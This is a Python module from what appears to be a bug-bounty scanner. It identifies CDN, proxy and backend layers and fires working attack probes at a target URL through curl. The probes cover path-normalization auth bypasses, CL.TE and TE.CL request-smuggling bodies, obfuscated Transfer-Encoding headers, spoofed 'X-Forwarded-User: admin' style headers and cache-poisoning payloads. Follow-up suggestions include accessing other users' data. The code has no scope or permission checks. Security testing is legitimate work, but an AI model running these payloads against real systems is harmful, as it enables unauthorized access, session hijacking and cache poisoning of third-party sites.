"""Inter-Component Edge Analyzer for Project Triage v4.

Finds bugs at the EDGES between components - where the CDN interprets headers
differently than the backend, where the proxy normalizes URLs differently than
the app server. This is how Orange Tsai found 9 CVEs in Apache and James Kettle
earned $350K from desync research.

Core insight: bugs live at boundaries where two components DISAGREE about the
meaning of the same data.
"""

from __future__ import annotations

import json
import re
import time
import urllib.parse
from dataclasses import dataclass, field
from typing import Any

from utils import run_cmd, sanitize_subprocess_arg


# ---------------------------------------------------------------------------
# Data models
# ---------------------------------------------------------------------------

@dataclass
class ComponentEdge:
    """Represents a boundary between two components where disagreement exists."""
    upstream: str          # e.g., "cloudflare_cdn"
    downstream: str        # e.g., "nginx_proxy"
    data_type: str         # e.g., "url_path", "content_length", "transfer_encoding"
    disagreement: str      # description of potential semantic mismatch
    test_payload: str      # specific payload to test
    severity: str          # critical / high / medium


@dataclass
class EdgeFinding:
    """Result of testing a specific component edge."""
    edge: ComponentEdge
    confirmed: bool
    evidence: str
    impact: str


# ---------------------------------------------------------------------------
# Component detection helpers
# ---------------------------------------------------------------------------

_CDN_HEADERS = {
    "cf-ray": "cloudflare",
    "cf-cache-status": "cloudflare",
    "x-amz-cf-id": "cloudfront",
    "x-amz-cf-pop": "cloudfront",
    "x-cache": "cdn_generic",
    "x-fastly-request-id": "fastly",
    "x-served-by": "fastly",
    "x-akamai-transformed": "akamai",
    "x-cdn": "cdn_generic",
    "x-vercel-id": "vercel",
    "x-vercel-cache": "vercel",
    "fly-request-id": "fly_io",
}

_SERVER_MAP = {
    "nginx": "nginx",
    "apache": "apache",
    "openresty": "openresty",
    "cloudflare": "cloudflare",
    "gunicorn": "gunicorn",
    "uvicorn": "uvicorn",
    "envoy": "envoy",
    "haproxy": "haproxy",
    "caddy": "caddy",
    "lighttpd": "lighttpd",
    "litespeed": "litespeed",
    "microsoft-iis": "iis",
    "cowboy": "cowboy",
}

_FRAMEWORK_MAP = {
    "express": "express",
    "next.js": "nextjs",
    "nuxt": "nuxt",
    "asp.net": "aspnet",
    "django": "django",
    "flask": "flask",
    "rails": "rails",
    "spring": "spring",
    "laravel": "laravel",
    "php": "php",
    "wordpress": "wordpress",
}


# ---------------------------------------------------------------------------
# Edge pattern definitions
# ---------------------------------------------------------------------------

def _url_normalization_edges() -> list[dict[str, str]]:
    """URL path normalization disagreement patterns."""
    return [
        {
            "data_type": "url_path",
            "disagreement": "CDN normalizes ../ but backend does not",
            "test_payload": "/api/../admin",
            "severity": "critical",
        },
        {
            "data_type": "url_path",
            "disagreement": "Proxy strips trailing dot but backend does not",
            "test_payload": "/api/endpoint.",
            "severity": "medium",
        },
        {
            "data_type": "url_path",
            "disagreement": "Frontend URL-decodes path but backend does not",
            "test_payload": "/api/%2e%2e/admin",
            "severity": "critical",
        },
        {
            "data_type": "url_path",
            "disagreement": "Case sensitivity handling differs between components",
            "test_payload": "/API/ADMIN",
            "severity": "high",
        },
        {
            "data_type": "url_path",
            "disagreement": "Backslash handling differs between components",
            "test_payload": "/api\\admin",
            "severity": "high",
        },
        {
            "data_type": "url_path",
            "disagreement": "Null byte handling differs between components",
            "test_payload": "/api/file%00.jpg",
            "severity": "critical",
        },
        {
            "data_type": "url_path",
            "disagreement": "Semicolon path parameter parsed by one component but not another",
            "test_payload": "/api/;admin",
            "severity": "high",
        },
        {
            "data_type": "url_path",
            "disagreement": "Double URL encoding decoded at different layers",
            "test_payload": "/api/%252e%252e/admin",
            "severity": "critical",
        },
    ]


def _header_parsing_edges() -> list[dict[str, str]]:
    """Header parsing disagreement patterns."""
    return [
        {
            "data_type": "transfer_encoding",
            "disagreement": "Content-Length vs Transfer-Encoding priority differs (CL.TE / TE.CL desync)",
            "test_payload": "CL:1 TE:chunked",
            "severity": "critical",
        },
        {
            "data_type": "transfer_encoding",
            "disagreement": "Transfer-Encoding obfuscation - space before colon accepted by one side",
            "test_payload": "Transfer-Encoding : chunked",
            "severity": "critical",
        },
        {
            "data_type": "content_type",
            "disagreement": "Multiple Content-Type headers handled differently",
            "test_payload": "Content-Type: text/html\r\nContent-Type: application/json",
            "severity": "high",
        },
        {
            "data_type": "header_case",
            "disagreement": "Header name case sensitivity handled differently",
            "test_payload": "Content-TYPE vs content-type",
            "severity": "medium",
        },
        {
            "data_type": "header_folding",
            "disagreement": "Obsolete HTTP/1.0 header line folding accepted by one component",
            "test_payload": "X-Test: value\r\n continued",
            "severity": "high",
        },
        {
            "data_type": "header_whitespace",
            "disagreement": "Tab vs space in header value parsed differently",
            "test_payload": "Transfer-Encoding:\tchunked",
            "severity": "high",
        },
    ]


def _auth_boundary_edges() -> list[dict[str, str]]:
    """Authentication boundary disagreement patterns."""
    return [
        {
            "data_type": "auth_header",
            "disagreement": "Proxy authenticates but backend trusts X-Forwarded-User blindly",
            "test_payload": "X-Forwarded-User: admin",
            "severity": "critical",
        },
        {
            "data_type": "url_path",
            "disagreement": "Auth checked at path level but backend routes request differently after normalization",
            "test_payload": "/public/../admin/secret",
            "severity": "critical",
        },
        {
            "data_type": "auth_header",
            "disagreement": "JWT validated at gateway but claims trusted blindly by backend service",
            "test_payload": "modify-claims-after-gateway",
            "severity": "critical",
        },
        {
            "data_type": "cookie",
            "disagreement": "Session cookie domain scope mismatch - subdomain A cookie accepted by subdomain B",
            "test_payload": "cross-subdomain-cookie",
            "severity": "high",
        },
    ]


def _cache_boundary_edges() -> list[dict[str, str]]:
    """Cache boundary disagreement patterns."""
    return [
        {
            "data_type": "url_path",
            "disagreement": "Cache keys URL differently than origin - trailing slash / query string variance",
            "test_payload": "/page vs /page/ vs /page?",
            "severity": "high",
        },
        {
            "data_type": "cache_key",
            "disagreement": "Unkeyed headers reflected in cached response - cache poisoning via X-Forwarded-Host",
            "test_payload": "X-Forwarded-Host: evil.com",
            "severity": "critical",
        },
        {
            "data_type": "cache_key",
            "disagreement": "Cache stores error responses that are then served to other users",
            "test_payload": "trigger-error-check-cache",
            "severity": "high",
        },
        {
            "data_type": "cache_key",
            "disagreement": "Vary header ignored by CDN - different Accept values get same cached response",
            "test_payload": "Accept: application/json vs Accept: text/html",
            "severity": "high",
        },
    ]


# ---------------------------------------------------------------------------
# Main analyzer
# ---------------------------------------------------------------------------

class EdgeAnalyzer:
    """Finds bugs at boundaries where two components disagree about
    the meaning of the same data."""

    def __init__(self) -> None:
        self.edge_patterns: dict[str, list[dict[str, str]]] = {
            "url_normalization": _url_normalization_edges(),
            "header_parsing": _header_parsing_edges(),
            "auth_boundary": _auth_boundary_edges(),
            "cache_boundary": _cache_boundary_edges(),
        }
        # Component pairs known to have specific edge issues
        self._component_edge_relevance: dict[tuple[str, str], list[str]] = {
            ("cloudflare", "nginx"): ["url_normalization", "header_parsing", "cache_boundary"],
            ("cloudflare", "apache"): ["url_normalization", "header_parsing", "cache_boundary"],
            ("cloudflare", "express"): ["url_normalization", "cache_boundary", "auth_boundary"],
            ("cloudflare", "nextjs"): ["url_normalization", "cache_boundary"],
            ("cloudfront", "nginx"): ["url_normalization", "header_parsing", "cache_boundary"],
            ("cloudfront", "apache"): ["url_normalization", "header_parsing", "cache_boundary"],
            ("cloudfront", "express"): ["url_normalization", "cache_boundary"],
            ("fastly", "nginx"): ["url_normalization", "header_parsing", "cache_boundary"],
            ("fastly", "apache"): ["url_normalization", "header_parsing", "cache_boundary"],
            ("nginx", "gunicorn"): ["url_normalization", "header_parsing", "auth_boundary"],
            ("nginx", "uvicorn"): ["url_normalization", "header_parsing", "auth_boundary"],
            ("nginx", "express"): ["url_normalization", "header_parsing", "auth_boundary"],
            ("nginx", "django"): ["url_normalization", "auth_boundary"],
            ("nginx", "flask"): ["url_normalization", "auth_boundary"],
            ("nginx", "php"): ["url_normalization", "header_parsing", "auth_boundary"],
            ("nginx", "rails"): ["url_normalization", "auth_boundary"],
            ("nginx", "nextjs"): ["url_normalization", "auth_boundary"],
            ("apache", "php"): ["url_normalization", "header_parsing", "auth_boundary"],
            ("apache", "django"): ["url_normalization", "auth_boundary"],
            ("apache", "flask"): ["url_normalization", "auth_boundary"],
            ("apache", "rails"): ["url_normalization", "auth_boundary"],
            ("haproxy", "nginx"): ["header_parsing", "url_normalization"],
            ("haproxy", "apache"): ["header_parsing", "url_normalization"],
            ("envoy", "nginx"): ["header_parsing", "url_normalization"],
            ("envoy", "express"): ["header_parsing", "url_normalization", "auth_boundary"],
            ("vercel", "nextjs"): ["url_normalization", "cache_boundary", "auth_boundary"],
            ("iis", "aspnet"): ["url_normalization", "header_parsing", "auth_boundary"],
            ("caddy", "express"): ["url_normalization", "auth_boundary"],
            ("caddy", "flask"): ["url_normalization", "auth_boundary"],
            ("litespeed", "php"): ["url_normalization", "header_parsing"],
            ("litespeed", "wordpress"): ["url_normalization", "header_parsing", "auth_boundary"],
        }

    # ------------------------------------------------------------------
    # Component identification
    # ------------------------------------------------------------------

    def identify_components(
        self, url: str, headers: dict[str, str], tech_stack: dict[str, Any]
    ) -> list[str]:
        """Identify the component stack from response headers and tech fingerprint.

        Returns ordered list from outermost (CDN) to innermost (database).
        E.g. ["cloudflare", "nginx", "nextjs", "postgresql"]
        """
        components: list[str] = []
        seen: set[str] = set()

        def _add(name: str) -> None:
            if name and name not in seen:
                components.append(name)
                seen.add(name)

        lower_headers = {k.lower(): v.lower() for k, v in headers.items()}

        # 1. CDN layer - detect from CDN-specific headers
        for hdr, cdn_name in _CDN_HEADERS.items():
            if hdr in lower_headers:
                _add(cdn_name)

        # Via header can reveal proxies
        via = lower_headers.get("via", "")
        if via:
            for token in via.split(","):
                token_lower = token.strip().lower()
                for name in ("varnish", "squid", "cloudfront", "akamai"):
                    if name in token_lower:
                        _add(name)

        # 2. Server / proxy layer
        server = lower_headers.get("server", "")
        for pattern, name in _SERVER_MAP.items():
            if pattern in server:
                _add(name)

        x_powered = lower_headers.get("x-powered-by", "")
        for pattern, name in _FRAMEWORK_MAP.items():
            if pattern in x_powered.lower():
                _add(name)

        # 3. Tech stack enrichment
        if tech_stack:
            for key in ("cdn", "proxy", "server", "framework", "language", "cms", "database"):
                val = tech_stack.get(key)
                if isinstance(val, str) and val:
                    _add(val.lower().replace(" ", "_"))
                elif isinstance(val, list):
                    for v in val:
                        if isinstance(v, str) and v:
                            _add(v.lower().replace(" ", "_"))

        return components

    # ------------------------------------------------------------------
    # Edge test generation
    # ------------------------------------------------------------------

    def generate_edge_tests(
        self, components: list[str], url: str
    ) -> list[ComponentEdge]:
        """For each adjacent pair of components, generate relevant edge tests.

        Filters disagreement patterns by which ones apply to the specific
        component pair.
        """
        edges: list[ComponentEdge] = []

        if len(components) < 2:
            # Not enough components to form edges - run all patterns as generic
            for category, patterns in self.edge_patterns.items():
                upstream = components[0] if components else "unknown"
                for pat in patterns:
                    edges.append(ComponentEdge(
                        upstream=upstream,
                        downstream="unknown",
                        data_type=pat["data_type"],
                        disagreement=pat["disagreement"],
                        test_payload=pat["test_payload"],
                        severity=pat["severity"],
                    ))
            return edges

        # Generate edges for each adjacent component pair
        for i in range(len(components) - 1):
            upstream = components[i]
            downstream = components[i + 1]
            pair = (upstream, downstream)

            # Determine which pattern categories apply
            relevant_categories = self._component_edge_relevance.get(pair)
            if relevant_categories is None:
                # Unknown pair - test everything
                relevant_categories = list(self.edge_patterns.keys())

            for category in relevant_categories:
                patterns = self.edge_patterns.get(category, [])
                for pat in patterns:
                    edges.append(ComponentEdge(
                        upstream=upstream,
                        downstream=downstream,
                        data_type=pat["data_type"],
                        disagreement=pat["disagreement"],
                        test_payload=pat["test_payload"],
                        severity=pat["severity"],
                    ))

        return edges

    # ------------------------------------------------------------------
    # URL normalization testing
    # ------------------------------------------------------------------

    def test_url_normalization(self, url: str) -> list[EdgeFinding]:
        """Send path traversal, encoding, and normalization variants.

        Compare responses to detect when different components interpret the
        path differently. A significant response difference (status code
        change, content length change) indicates an edge bug.
        """
        findings: list[EdgeFinding] = []
        parsed = urllib.parse.urlparse(url)
        base = f"{parsed.scheme}://{parsed.netloc}"
        clean_path = parsed.path.rstrip("/") or ""

        # First get baseline response
        baseline = self._curl_probe(url)
        if baseline["returncode"] != 0:
            return findings

        baseline_status = self._extract_status(baseline["stdout"])
        baseline_size = self._extract_size(baseline["stdout"])

        # URL normalization test payloads
        test_cases: list[dict[str, str]] = [
            {
                "name": "path_traversal_dotdot",
                "path": f"/anything/../{clean_path.lstrip('/')}",
                "disagreement": "CDN normalizes ../ but backend does not",
            },
            {
                "name": "url_encoded_dotdot",
                "path": f"/%2e%2e/{clean_path.lstrip('/')}",
                "disagreement": "Frontend URL-decodes path but backend does not",
            },
            {
                "name": "double_encoded_dotdot",
                "path": f"/%252e%252e/{clean_path.lstrip('/')}",
                "disagreement": "Double URL encoding decoded at different layers",
            },
            {
                "name": "trailing_dot",
                "path": f"{clean_path}.",
                "disagreement": "Proxy strips trailing dot but backend does not",
            },
            {
                "name": "case_variation",
                "path": clean_path.upper() if clean_path else "/",
                "disagreement": "Case sensitivity handling differs between components",
            },
            {
                "name": "backslash",
                "path": clean_path.replace("/", "\\", 1) if clean_path else "\\",
                "disagreement": "Backslash handling differs between components",
            },
            {
                "name": "null_byte",
                "path": f"{clean_path}%00.jpg",
                "disagreement": "Null byte handling differs between components",
            },
            {
                "name": "semicolon_param",
                "path": f"{clean_path};.css",
                "disagreement": "Semicolon path parameter parsed by one component but not another",
            },
            {
                "name": "trailing_slash_variance",
                "path": f"{clean_path}/",
                "disagreement": "Trailing slash causes different routing at proxy vs backend",
            },
        ]

        for tc in test_cases:
            test_url = f"{base}{tc['path']}"
            result = self._curl_probe(test_url)
            if result["returncode"] != 0:
                continue

            test_status = self._extract_status(result["stdout"])
            test_size = self._extract_size(result["stdout"])

            # Detect meaningful differences
            confirmed = False
            evidence_parts: list[str] = []

            if baseline_status and test_status and baseline_status != test_status:
                # Status code difference is strong signal
                evidence_parts.append(
                    f"Status changed: {baseline_status} -> {test_status}"
                )
                # If we went from 403/404 to 200, that is a bypass
                if test_status == "200" and baseline_status in ("403", "401", "404"):
                    confirmed = True
                    evidence_parts.append("ACCESS BYPASS DETECTED")
                elif baseline_status == "200" and test_status in ("403", "401", "404"):
                    evidence_parts.append("Path interpreted differently by components")

            if baseline_size and test_size:
                size_diff = abs(int(test_size) - int(baseline_size))
                if size_diff > 100:
                    evidence_parts.append(
                        f"Response size changed: {baseline_size} -> {test_size} (diff: {size_diff})"
                    )

            if evidence_parts:
                impact = "Path normalization disagreement"
                if confirmed:
                    impact = "Access control bypass via path normalization confusion"

                severity = "high" if confirmed else "medium"
                findings.append(EdgeFinding(
                    edge=ComponentEdge(
                        upstream="proxy/cdn",
                        downstream="backend",
                        data_type="url_path",
                        disagreement=tc["disagreement"],
                        test_payload=tc["path"],
                        severity="critical" if confirmed else severity,
                    ),
                    confirmed=confirmed,
                    evidence=" | ".join(evidence_parts),
                    impact=impact,
                ))

        return findings

    # ------------------------------------------------------------------
    # Header parsing testing
    # ------------------------------------------------------------------

    def test_header_parsing(self, url: str) -> list[EdgeFinding]:
        """Send header disagreement payloads to detect desync and parsing issues.

        Focus on CL/TE conflicts, header case, line folding.
        Uses timing-based detection for desync (>3s delay = potential).
        """
        findings: list[EdgeFinding] = []

        # --- CL.TE desync probe ---
        # Send a request with both Content-Length and Transfer-Encoding.
        # If the frontend uses CL and backend uses TE (or vice versa), the
        # body boundary is ambiguous.
        clte_result = self._curl_raw(
            url,
            extra_headers=[
                "Content-Length: 6",
                "Transfer-Encoding: chunked",
            ],
            body="0\r\n\r\nG",
            method="POST",
            timeout=10,
        )
        if clte_result["returncode"] == 0:
            clte_status = self._extract_status(clte_result["stdout"])
            if clte_status and clte_status not in ("400", "403"):
                findings.append(EdgeFinding(
                    edge=ComponentEdge(
                        upstream="frontend",
                        downstream="backend",
                        data_type="transfer_encoding",
                        disagreement="CL.TE desync - frontend uses Content-Length, backend uses Transfer-Encoding",
                        test_payload="CL:6 TE:chunked body:0\\r\\n\\r\\nG",
                        severity="critical",
                    ),
                    confirmed=False,
                    evidence=f"Server accepted CL+TE request with status {clte_status} (not rejected)",
                    impact="HTTP request smuggling - route requests to other users or bypass security controls",
                ))
        elif "timed out" in clte_result.get("stderr", "").lower():
            findings.append(EdgeFinding(
                edge=ComponentEdge(
                    upstream="frontend",
                    downstream="backend",
                    data_type="transfer_encoding",
                    disagreement="CL.TE desync - timeout indicates body parsing confusion",
                    test_payload="CL:6 TE:chunked body:0\\r\\n\\r\\nG",
                    severity="critical",
                ),
                confirmed=False,
                evidence="Request timed out - backend may be waiting for more data (desync signal)",
                impact="HTTP request smuggling - body boundary confusion between components",
            ))

        # --- TE.CL desync probe ---
        tecl_result = self._curl_raw(
            url,
            extra_headers=[
                "Content-Length: 3",
                "Transfer-Encoding: chunked",
            ],
            body="8\r\nSMUGGLED\r\n0\r\n\r\n",
            method="POST",
            timeout=10,
        )
        if "timed out" in tecl_result.get("stderr", "").lower():
            findings.append(EdgeFinding(
                edge=ComponentEdge(
                    upstream="frontend",
                    downstream="backend",
                    data_type="transfer_encoding",
                    disagreement="TE.CL desync - frontend uses TE, backend uses CL",
                    test_payload="CL:3 TE:chunked body:8\\r\\nSMUGGLED\\r\\n0\\r\\n\\r\\n",
                    severity="critical",
                ),
                confirmed=False,
                evidence="Request timed out - strong desync signal",
                impact="HTTP request smuggling via TE.CL confusion",
            ))

        # --- TE obfuscation variants ---
        te_obfuscations = [
            ("Transfer-Encoding : chunked", "space before colon"),
            ("Transfer-Encoding: \tchunked", "tab in value"),
            ("Transfer-Encoding: chunked\r\nTransfer-encoding: x", "duplicate TE with different case"),
            ("Transfer-Encoding:\x0bchunked", "vertical tab before value"),
            ("Transfer-Encoding: chunKed", "mixed case value"),
        ]
        for te_header, desc in te_obfuscations:
            obf_result = self._curl_raw(
                url,
                raw_headers=[te_header],
                body="0\r\n\r\n",
                method="POST",
                timeout=8,
            )
            if obf_result["returncode"] == 0:
                obf_status = self._extract_status(obf_result["stdout"])
                if obf_status and obf_status == "200":
                    findings.append(EdgeFinding(
                        edge=ComponentEdge(
                            upstream="frontend",
                            downstream="backend",
                            data_type="transfer_encoding",
                            disagreement=f"TE obfuscation accepted - {desc}",
                            test_payload=te_header,
                            severity="critical",
                        ),
                        confirmed=False,
                        evidence=f"Obfuscated TE header ({desc}) accepted with status {obf_status}",
                        impact="Potential request smuggling via TE obfuscation",
                    ))

        # --- Header line folding ---
        fold_result = self._curl_raw(
            url,
            raw_headers=["X-Test: value\r\n continued-value"],
            method="GET",
            timeout=8,
        )
        if fold_result["returncode"] == 0:
            fold_status = self._extract_status(fold_result["stdout"])
            if fold_status and fold_status not in ("400",):
                findings.append(EdgeFinding(
                    edge=ComponentEdge(
                        upstream="frontend",
                        downstream="backend",
                        data_type="header_folding",
                        disagreement="Obsolete HTTP/1.0 header line folding accepted",
                        test_payload="X-Test: value\\r\\n continued-value",
                        severity="high",
                    ),
                    confirmed=False,
                    evidence=f"Line-folded header accepted with status {fold_status}",
                    impact="Header injection via line folding if proxy and backend disagree on parsing",
                ))

        return findings

    # ------------------------------------------------------------------
    # Auth boundary testing
    # ------------------------------------------------------------------

    def test_auth_boundaries(
        self, url: str, auth_header: str = ""
    ) -> list[EdgeFinding]:
        """Test authentication boundary disagreements.

        Tests X-Forwarded-User injection, path traversal past auth middleware,
        and endpoint access with and without auth at different path forms.
        """
        findings: list[EdgeFinding] = []
        parsed = urllib.parse.urlparse(url)
        base = f"{parsed.scheme}://{parsed.netloc}"

        # --- X-Forwarded-User / X-Remote-User injection ---
        spoofed_user_headers = [
            ("X-Forwarded-User", "admin"),
            ("X-Remote-User", "admin"),
            ("X-Forwarded-For-User", "admin"),
            ("X-Original-User", "admin"),
            ("Remote-User", "admin"),
        ]

        # Baseline without auth
        baseline = self._curl_probe(url)
        baseline_status = self._extract_status(baseline["stdout"])

        for header_name, header_value in spoofed_user_headers:
            result = self._curl_probe(
                url,
                extra_headers=[f"{header_name}: {header_value}"],
            )
            test_status = self._extract_status(result["stdout"])
            test_size = self._extract_size(result["stdout"])
            baseline_size = self._extract_size(baseline["stdout"])

            if baseline_status and test_status:
                # If we go from 401/403 to 200 by adding the header, confirmed bypass
                if baseline_status in ("401", "403") and test_status == "200":
                    findings.append(EdgeFinding(
                        edge=ComponentEdge(
                            upstream="proxy",
                            downstream="backend",
                            data_type="auth_header",
                            disagreement=f"Backend trusts {header_name} header without proxy validation",
                            test_payload=f"{header_name}: {header_value}",
                            severity="critical",
                        ),
                        confirmed=True,
                        evidence=f"Status {baseline_status} -> {test_status} with spoofed {header_name}",
                        impact=f"Authentication bypass via {header_name} header injection",
                    ))
                elif test_size and baseline_size:
                    size_diff = abs(int(test_size) - int(baseline_size))
                    if size_diff > 200:
                        findings.append(EdgeFinding(
                            edge=ComponentEdge(
                                upstream="proxy",
                                downstream="backend",
                                data_type="auth_header",
                                disagreement=f"Different response with {header_name} header - possible auth confusion",
                                test_payload=f"{header_name}: {header_value}",
                                severity="high",
                            ),
                            confirmed=False,
                            evidence=f"Response size diff: {size_diff} bytes with {header_name}: {header_value}",
                            impact="Potential auth bypass or information disclosure via trusted header injection",
                        ))

        # --- Path traversal past auth middleware ---
        auth_bypass_paths = [
            "/public/../admin",
            "/static/../api/admin",
            "/api/v1/..;/admin",
            "/api/v1/%2e%2e/admin",
            "/api/v1/./admin",
            "//admin",
            "/api/admin%20",
            "/api/admin/.",
            "/api/admin%23",
        ]

        for path in auth_bypass_paths:
            test_url = f"{base}{path}"
            result = self._curl_probe(test_url)
            test_status = self._extract_status(result["stdout"])

            # Check against both the direct admin path and the baseline
            if test_status == "200":
                # Check if the direct admin path returns 401/403
                direct_url = f"{base}/admin"
                direct_result = self._curl_probe(direct_url)
                direct_status = self._extract_status(direct_result["stdout"])

                if direct_status in ("401", "403", "404") and test_status == "200":
                    findings.append(EdgeFinding(
                        edge=ComponentEdge(
                            upstream="auth_middleware",
                            downstream="backend_router",
                            data_type="url_path",
                            disagreement="Auth checked at path level but backend routes differently after normalization",
                            test_payload=path,
                            severity="critical",
                        ),
                        confirmed=True,
                        evidence=f"Direct /admin: {direct_status} | Traversal {path}: {test_status}",
                        impact="Authentication bypass via path traversal past auth middleware",
                    ))

        # --- With vs without auth at path variants ---
        if auth_header:
            path_variants = [
                parsed.path,
                parsed.path + "/",
                parsed.path.rstrip("/"),
                parsed.path + "?",
                parsed.path + "#",
                parsed.path + "%20",
            ]

            for variant_path in path_variants:
                variant_url = f"{base}{variant_path}"
                # With auth
                authed = self._curl_probe(variant_url, extra_headers=[auth_header])
                authed_status = self._extract_status(authed["stdout"])
                # Without auth
                unauthed = self._curl_probe(variant_url)
                unauthed_status = self._extract_status(unauthed["stdout"])

                if (authed_status == "200" and unauthed_status == "200"
                        and baseline_status in ("401", "403")):
                    findings.append(EdgeFinding(
                        edge=ComponentEdge(
                            upstream="auth_layer",
                            downstream="backend",
                            data_type="url_path",
                            disagreement=f"Path variant '{variant_path}' bypasses auth check",
                            test_payload=variant_path,
                            severity="critical",
                        ),
                        confirmed=True,
                        evidence=f"Original: {baseline_status} | Variant '{variant_path}': {unauthed_status} (no auth)",
                        impact="Authentication bypass via URL path variant",
                    ))

        return findings

    # ------------------------------------------------------------------
    # Full edge analysis
    # ------------------------------------------------------------------

    def full_edge_analysis(
        self, url: str, tech_stack: dict[str, Any]
    ) -> dict[str, Any]:
        """Run all edge tests and return combined results.

        Returns:
            {
                "components": list of detected components,
                "edges_tested": number of edge patterns tested,
                "findings": list of EdgeFinding dicts,
                "hypotheses": list of attack graph hypotheses,
            }
        """
        # Fetch headers for component identification
        probe = self._curl_probe(url, include_headers=True)
        headers = self._parse_response_headers(probe["stdout"])

        components = self.identify_components(url, headers, tech_stack)
        edge_tests = self.generate_edge_tests(components, url)

        all_findings: list[EdgeFinding] = []

        # Run each test category
        url_findings = self.test_url_normalization(url)
        all_findings.extend(url_findings)

        header_findings = self.test_header_parsing(url)
        all_findings.extend(header_findings)

        auth_findings = self.test_auth_boundaries(url)
        all_findings.extend(auth_findings)

        hypotheses = self.findings_to_hypotheses(all_findings)

        return {
            "components": components,
            "edges_tested": len(edge_tests),
            "findings": [
                {
                    "edge": {
                        "upstream": f.edge.upstream,
                        "downstream": f.edge.downstream,
                        "data_type": f.edge.data_type,
                        "disagreement": f.edge.disagreement,
                        "test_payload": f.edge.test_payload,
                        "severity": f.edge.severity,
                    },
                    "confirmed": f.confirmed,
                    "evidence": f.evidence,
                    "impact": f.impact,
                }
                for f in all_findings
            ],
            "hypotheses": hypotheses,
        }

    # ------------------------------------------------------------------
    # Hypothesis generation
    # ------------------------------------------------------------------

    def findings_to_hypotheses(
        self, findings: list[EdgeFinding]
    ) -> list[dict[str, Any]]:
        """Convert confirmed or potential edge findings into attack graph hypotheses.

        These get high novelty scores - inter-component edge bugs are the
        $350K class that most scanners miss entirely.
        """
        hypotheses: list[dict[str, Any]] = []

        for finding in findings:
            # Novelty scoring - edge bugs are inherently high novelty
            base_novelty = 0.8
            if finding.confirmed:
                base_novelty = 0.95
            if finding.edge.severity == "critical":
                base_novelty = min(base_novelty + 0.05, 1.0)
            if "desync" in finding.edge.disagreement.lower():
                base_novelty = min(base_novelty + 0.05, 1.0)
            if "bypass" in finding.impact.lower():
                base_novelty = min(base_novelty + 0.05, 1.0)

            # Confidence based on confirmation status
            confidence = 0.85 if finding.confirmed else 0.45

            hypothesis = {
                "type": "edge_disagreement",
                "title": f"Edge bug: {finding.edge.upstream} vs {finding.edge.downstream} - {finding.edge.data_type}",
                "description": finding.edge.disagreement,
                "evidence": finding.evidence,
                "impact": finding.impact,
                "test_payload": finding.edge.test_payload,
                "severity": finding.edge.severity,
                "confirmed": finding.confirmed,
                "confidence": confidence,
                "novelty": base_novelty,
                "category": f"inter_component_{finding.edge.data_type}",
                "attack_surface": f"{finding.edge.upstream} -> {finding.edge.downstream}",
                "next_steps": self._suggest_next_steps(finding),
            }
            hypotheses.append(hypothesis)

        # Sort by confirmed first, then by novelty
        hypotheses.sort(key=lambda h: (not h["confirmed"], -h["novelty"]))
        return hypotheses

    # ------------------------------------------------------------------
    # Internal helpers
    # ------------------------------------------------------------------

    def _suggest_next_steps(self, finding: EdgeFinding) -> list[str]:
        """Suggest follow-up tests based on finding type."""
        steps: list[str] = []
        dt = finding.edge.data_type

        if dt in ("transfer_encoding", "content_length"):
            steps.append("Attempt full CL.TE and TE.CL smuggling with prefix injection")
            steps.append("Try smuggling a GET /admin request via body")
            steps.append("Test with HTTP/2 downgrade to HTTP/1.1 for H2.CL desync")
        elif dt == "url_path":
            if "bypass" in finding.impact.lower():
                steps.append("Map all protected endpoints and test each with the bypass path")
                steps.append("Attempt to access admin functionality via the normalized path")
                steps.append("Chain with SSRF if internal endpoints become reachable")
            else:
                steps.append("Test more encoding variants: double encoding, overlong UTF-8")
                steps.append("Combine path confusion with verb tampering (GET vs POST)")
        elif dt == "auth_header":
            steps.append("Enumerate valid usernames via the spoofed header")
            steps.append("Try accessing other users' data with different header values")
            steps.append("Check if the header grants different privilege levels")
        elif dt in ("cache_key",):
            steps.append("Attempt cache poisoning with reflected unkeyed headers")
            steps.append("Test cache deception to steal authenticated responses")
            steps.append("Verify Vary header behavior across different CDN PoPs")
        elif dt == "cookie":
            steps.append("Test session fixation across subdomains")
            steps.append("Attempt to override cookies from a sibling subdomain")
        else:
            steps.append("Expand testing to adjacent endpoints")
            steps.append("Combine with other findings for chained exploitation")

        return steps

    def _curl_probe(
        self,
        url: str,
        extra_headers: list[str] | None = None,
        include_headers: bool = False,
    ) -> dict[str, Any]:
        """Send a GET request via curl and return structured output."""
        safe_url = sanitize_subprocess_arg(url, "url")
        cmd = [
            "curl", "-s", "-o", "/dev/null",
            "-w", "%{http_code}|%{size_download}|%{time_total}",
            "--max-time", "10",
            "-k",  # allow self-signed
        ]

        if include_headers:
            cmd = [
                "curl", "-s", "-D", "-",
                "-o", "/dev/null",
                "--max-time", "10",
                "-k",
            ]

        if extra_headers:
            for h in extra_headers:
                cmd.extend(["-H", h])

        cmd.append(safe_url)
        return run_cmd(cmd, timeout=15)

    def _curl_raw(
        self,
        url: str,
        extra_headers: list[str] | None = None,
        raw_headers: list[str] | None = None,
        body: str = "",
        method: str = "GET",
        timeout: int = 10,
    ) -> dict[str, Any]:
        """Send a raw HTTP request via curl for desync testing."""
        safe_url = sanitize_subprocess_arg(url, "url")
        cmd = [
            "curl", "-s", "-o", "/dev/null",
            "-w", "%{http_code}|%{size_download}|%{time_total}",
            "--max-time", str(timeout),
            "-k",
            "-X", method,
        ]

        if extra_headers:
            for h in extra_headers:
                cmd.extend(["-H", h])

        if raw_headers:
            for h in raw_headers:
                cmd.extend(["--header", h])

        if body:
            cmd.extend(["--data-binary", body])

        cmd.append(safe_url)
        return run_cmd(cmd, timeout=timeout + 5)

    def _extract_status(self, output: str) -> str:
        """Extract HTTP status code from curl -w output."""
        if not output:
            return ""
        # curl -w format: status_code|size|time
        parts = output.strip().split("|")
        if parts and parts[0].isdigit():
            return parts[0]
        # Try to find a 3-digit status code
        match = re.search(r"\b(\d{3})\b", output)
        return match.group(1) if match else ""

    def _extract_size(self, output: str) -> str:
        """Extract response size from curl -w output."""
        if not output:
            return ""
        parts = output.strip().split("|")
        if len(parts) >= 2 and parts[1].isdigit():
            return parts[1]
        return ""

    def _parse_response_headers(self, raw: str) -> dict[str, str]:
        """Parse raw HTTP response headers into a dict."""
        headers: dict[str, str] = {}
        if not raw:
            return headers
        for line in raw.split("\n"):
            line = line.strip()
            if ":" in line:
                key, _, value = line.partition(":")
                headers[key.strip()] = value.strip()
        return headers
